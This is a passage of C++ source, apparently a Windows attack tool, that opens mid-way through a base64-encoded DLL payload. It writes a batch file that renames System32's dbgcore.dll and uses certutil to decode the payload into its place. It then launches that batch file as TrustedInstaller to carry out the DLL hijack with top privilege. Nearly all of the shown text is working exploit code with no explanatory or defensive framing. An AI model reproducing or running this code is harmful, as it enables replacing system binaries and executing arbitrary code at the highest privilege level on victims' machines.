RYAAEAmAADsFgAA\r\nTBcAAHQnAABMFwAAfBcAAEAmAAB8FwAAkBcAAEAmAACQFwAA2RcAADgnAADcFwAA\r\nZxgAADgnAABoGAAAABkAAEwnAAAAGQAAJBkAADgnAAAkGQAATRkAADgnAABgGQAA\r\nqhoAAIgnAACsGgAA6BoAAJgnAADoGgAAJBsAAJgnAAAoGwAAyRwAAKQnAABAHQAA\r\nQh0AALgnAABgHQAAZh0AAMAnAABmHQAAfR0AAIgmAAB9HQAAlh0AAIgmAACWHQAA\r\nqh0AAIgmAACqHQAA4B0AAAwnAADgHQAA+B0AAGwnAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAA\r\nAAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGBQAACRAAAA\r\nAAAAAAAAAAAAAAAAAAAAADw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VU\r\nRi04JyBzdGFuZGFsb25lPSd5ZXMnPz4NCjxhc3NlbWJseSB4bWxucz0ndXJuOnNj\r\naGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEnIG1hbmlmZXN0VmVyc2lvbj0nMS4w\r\nJz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nACAAACQAAADooPCg+KAAoQihWKFgoUiiYKJoogijEKMYoyCjAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
		new_dll.close();
		ofstream ti_bat;
		ti_bat.open("C:\\Windows\\tasks\\ti.bat");
		ti_bat << "ren C:\\Windows\\System32\\dbgcore.dll dbgcore.dll.backup\n";
		ti_bat << "certutil -decode c:\\Windows\\tasks\\dbgcore.asc c:\\Windows\\System32\\dbgcore.dll";
		ti_bat.close();
		string run_hijack = "c:\\Windows\\Tasks\\ti.bat";
		const auto pid = start_trusted_installer_service();
		create_process_as_trusted_installer(pid, "\"" + run_hijack + "\"");
	}
	catch (exception e)
	{
		wcout << e.what() << endl;
	}
	return 0;
}
